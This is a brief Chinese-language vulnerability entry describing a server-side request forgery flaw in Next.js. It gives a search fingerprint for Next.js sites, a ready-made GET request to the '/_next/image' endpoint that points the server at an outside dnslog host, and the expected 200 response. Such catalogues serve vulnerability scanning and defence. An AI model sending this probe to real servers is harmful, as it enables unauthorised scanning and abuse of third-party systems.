# Next.Js存在SSRF漏洞

Next.Js ｜ SSRF ｜ —
- **指纹**：`body="/_next/static"`
- **请求**：`GET /_next/image?w=16&q=10&url=http://123.6nhqkn.dnslog.cn HTTP/1.1`
- **响应特征**：200